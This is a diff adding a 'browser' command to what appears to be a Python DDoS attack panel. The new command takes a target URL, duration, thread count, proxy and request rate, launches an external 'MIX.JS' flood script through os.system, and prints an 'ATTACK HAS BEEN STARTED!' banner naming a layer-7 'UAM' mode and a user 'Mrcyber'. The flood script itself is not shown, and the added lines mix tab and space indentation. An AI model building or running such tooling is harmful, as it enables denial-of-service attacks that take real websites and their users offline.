@@ -880,7 +880,34 @@ def main():
 				main()
 			except IndexError:
 				main()
-                
+		elif sinput == "browser" or sinput == "BROWSER":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				thread = sin.split()[3]
+                                proxy = sin.split()[4]
+                                rps = sin.split()[5]
+				os.system(f'node MIX.JS {url} {time} {thread} {proxy} {rps}')
+				os.system ("clear")
+				print(f"""
+\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
+\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
+\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
+\033[1;37m                            ATTACK HAS BEEN STARTED!
+\033[35m                ╚╦════════════════════════════════════════════╦╝
+\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
+\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
+\033[1;37m                   THREAD     : \033[35m[ \033[1;37m{thread} \033[35m]
+\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
+\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
+\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
+\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
+\033[35m           ╚════════════════════════════════════════════════════════╝
+""")
+			except ValueError:
+				main()
+			except IndexError:
+				main()                
 
 		
 					
